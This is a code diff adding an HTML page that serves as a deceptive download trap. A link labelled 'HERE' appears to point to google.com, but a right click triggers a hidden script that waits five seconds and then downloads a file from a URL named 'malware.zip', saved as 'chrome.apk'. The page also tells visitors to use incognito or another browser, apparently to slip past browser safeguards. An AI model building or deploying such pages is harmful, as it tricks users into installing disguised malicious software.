@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Right-Click Instant Delay Download</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+    }
+
+    a.download-btn {
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      background-color: #4CAF50;
+      color: white;
+      text-decoration: none;
+      cursor: pointer;
+      display: inline-block;
+    }
+
+    a.download-btn:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Open this link on incognito or use other browser</h2>
+
+  <a 
+    href="https://google.com"
+    class="download-btn"
+    oncontextmenu="startDelay(); return true;"
+    onclick="event.preventDefault();"
+  >
+    HERE
+  </a>
+
+  <script>
+    const DOWNLOAD_URL = "https://frozzipies.github.io/malware.zip";
+    let running = false;
+
+    function startDelay() {
+      if (running) return;   // prevent double right-click spam
+      running = true;
+      setTimeout(() => {
+        const a = document.createElement("a");
+        a.href = DOWNLOAD_URL;
+        a.download = "chrome.apk";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        running = false;
+      }, 5000);
+    }
+  </script>
+
+</body>
+</html>
